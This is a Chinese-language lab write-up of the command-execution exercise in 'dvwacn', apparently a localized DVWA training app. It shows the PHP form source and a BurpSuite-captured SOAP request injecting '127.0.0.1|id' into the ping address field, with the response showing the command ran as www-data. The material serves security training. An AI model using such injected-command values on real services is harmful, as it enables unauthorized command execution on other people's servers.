#dvwacn之十一WebServices命令执行

dvwacn之之WebServices命令执行物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/ws-exec/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
 <?php 
/*  In the low level, neither the form nor the service do any validation.
 * 
 */

echo "
                <h2>Ping测试</h2>
        <p>请在下面文本框中输入一个ip地址:</p>
        <form name=\"ping\" action=\"javascript: beginPingLow()\">
            <input id=\"pingAddress\" type=\"text\" name=\"ip\" size=\"30\">
            <input id=\"pingButton\" type=\"Submit\" value=\"确定\" name=\"submit\">
        </form>
                <div id=\"results\"></div>";
?> 
```

- medium.php 

```
 <?php 
/*  In the medium level, form performs some strict validation before sending to the
 *      service which does no validation. Here the developer is relying on the client side
 *      code to do all validation, and we know what that means. 
 */

echo "
                <h2>Ping测试</h2>
        <p>请在下面文本框中输入一个ip地址:</p>
        <form name=\"ping\" action=\"javascript: beginPingMedium()\">
            <input id=\"pingAddress\" type=\"text\" name=\"ip\" size=\"30\">
            <input id=\"pingButton\" type=\"Submit\" value=\"确定\" name=\"submit\">
        </form>
                <div id=\"results\"></div>";
?> 
```


- high.php

``` 
 <?php 
/*  In the medium level, form performs some strict validation before sending to the
 *      service which does no validation. Here the developer is relying on the client side
 *      code to do all validation, and we know what that means. 
 */

echo "
                <h2>Ping测试</h2>
        <p>请在下面文本框中输入一个ip地址:</p>
        <form name=\"ping\" action=\"javascript: beginPingHigh()\">
            <input id=\"pingAddress\" type=\"text\" name=\"ip\" size=\"30\">
            <input id=\"pingButton\" type=\"Submit\" value=\"确定\" name=\"submit\">
        </form>
                <div id=\"results\"></div>";
?> 
```


##Ping测试

使用BurpSuite配合测试soap.wsdl

用户输入

```
127.0.0.1|id
```

BurpSuite捕获的http请求数据包

```
POST /dvwacn/vulnerabilities/ws-exec/ws-commandinj.php HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset="utf-8"
X-Requested-With: XMLHttpRequest
Referer: http://192.168.56.80/dvwacn/vulnerabilities/ws-exec/
Content-Length: 297
Cookie: security=low; PHPSESSID=ulabc0doicpbifpef5r00hbs52; Hm_lvt_76a0c683d2fe8348e3cb8ceaeca39b4d=1469415533; Hm_lpvt_76a0c683d2fe8348e3cb8ceaeca39b4d=1469415533; yunpian.lang=zh
Connection: close

<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><pingAddressLow xmlns="http://localhost"><address>127.0.0.1|id</address></pingAddressLow></soap:Body></soap:Envelope>
```


BurpSuite捕获的http返回数据包

```
HTTP/1.1 200 OK
Date: Mon, 25 Jul 2016 03:22:31 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.18
X-SOAP-Server: NuSOAP/0.9.5 (1.123)
Vary: Accept-Encoding
Content-Length: 571
Connection: close
Content-Type: text/xml; charset=gb2312

<?xml version="1.0" encoding="gb2312"?><SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:pingAddressLowResponse xmlns:ns1="http://localhost"><return xsi:type="xsd:string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</return></ns1:pingAddressLowResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

可以看到id命令被成功执行，返回

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```